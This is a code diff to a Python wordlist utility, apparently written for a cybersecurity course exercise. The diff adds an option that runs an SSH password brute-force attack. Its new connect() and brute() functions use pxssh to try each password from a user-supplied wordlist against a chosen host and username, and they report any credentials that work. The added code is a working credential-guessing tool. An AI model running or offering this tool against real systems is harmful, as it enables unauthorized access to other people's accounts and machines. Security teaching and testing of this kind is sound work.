@@ -5,10 +5,12 @@
 # Purpose:          List passwords in wordlist/Search wordlist for input
 # Sources:          https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/
 #                   https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-16/challenges/DEMO.md
+#                   https://gist.github.com/thewindcolince/d21a45b153f9f5662630fc94afba3bb0
 
 
 # Libraries
-import time
+import sys, time, termcolor
+from pexpect import pxssh
 
 # Functions
 def main():
@@ -17,7 +19,8 @@ def main():
         ***We Will RockYou Menu***
 1 - Iterate Dictionary/Wordlist
 2 - Search Dictionary/Wordlist
-3 - Exit Menu
+3 - Perform Brute-Force Attack
+4 - Exit Menu
 Please Select Mode:
 """)
         if choice=="1":
@@ -26,6 +29,8 @@ Please Select Mode:
             inspector()
             time.sleep(5)
         elif choice=="3":
+            brute()
+        elif choice=="4":
             break
         else:
             print("Invalid Mode! Try Again.")
@@ -57,6 +62,34 @@ def inspector():
     if flag==1: # if the password was matched above, print confirmation and line number
         print("That Password Was Found!","Line", index)
 
+
+def connect(host,user,line):
+    try:
+        ssh=pxssh.pxssh()
+        ssh.force_password=True
+        ssh.login(host,user,line)
+        print("PASSWORD FOUND!!! "+termcolor.colored(user+":"+line,'yellow'))
+        sys.exit(0)
+    except pxssh.ExceptionPxssh as e:
+        print(e)
+    except KeyboardInterrupt as k:
+        print("\n")
+        print("terminate")
+        print("raison:program stop by user",)
+        sys.exit(0)
+
+def brute():
+    s=pxssh.pxssh()
+    host=input("Enter IP Address:")
+    user=input("Enter Username:")
+    path=input("Enter Path To Wordlist/Dictionary:")
+    file=open(path, "r", encoding="ISO-8859-1")
+    for p in file.readlines():
+        username=user.strip("\n")
+        password=p.strip("\n")
+        print(str(username) + ":" + str(password))
+        connect(host,str(username),str(password))
+    file.close()
 
 # Main
 main()
